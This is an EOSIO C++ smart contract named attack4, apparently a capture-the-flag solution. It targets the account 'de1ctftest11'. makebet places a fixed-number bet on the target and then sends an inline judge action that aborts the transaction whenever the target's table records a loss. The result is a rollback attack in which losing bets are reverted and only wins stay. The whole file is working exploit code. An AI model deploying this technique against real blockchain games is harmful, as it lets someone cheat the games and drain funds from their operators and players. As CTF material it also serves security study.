#include <eosio/eosio.hpp>
#include <eosio/system.hpp>
#define TARGET_ACCOUNT "de1ctftest11"
using namespace eosio;

class [[eosio::contract]] attack4 : public contract {
  private:

    struct [[eosio::table]] user_info {
      name        username;
      uint32_t        win;
      uint32_t        lost;
      auto primary_key() const { return username.value; }
    };

    typedef eosio::multi_index<name("users"), user_info> user_info_table;

    user_info_table _users;

  public:
    using contract::contract;
    attack4( name receiver, name code, datastream<const char*> ds ):contract(receiver, code, ds),
                       _users(eosio::name(TARGET_ACCOUNT), eosio::name(TARGET_ACCOUNT).value) {}
    
    [[eosio::action]]
    void judge()
    {
      auto user_iterator = _users.find(get_self().value);
      check(user_iterator != _users.end(), "empty.");
      check(user_iterator->lost == 0, "you lost.");
    }

    [[eosio::action]]
    void makebet()
    {
      int random_num = 3;
      action(
        permission_level{get_self(),"active"_n},  //所需要的权限结构
        name(TARGET_ACCOUNT),                          // 调用的合约名称
        "bet"_n,                              // 合约的方法
        std::make_tuple(get_self(), random_num) // 传递的参数
      ).send();

      action(
        permission_level{get_self(),"active"_n},  //所需要的权限结构
        get_self(),                          // 调用的合约名称
        "judge"_n,                              // 合约的方法
        std::make_tuple(get_self()) // 传递的参数
      ).send();
    }
};

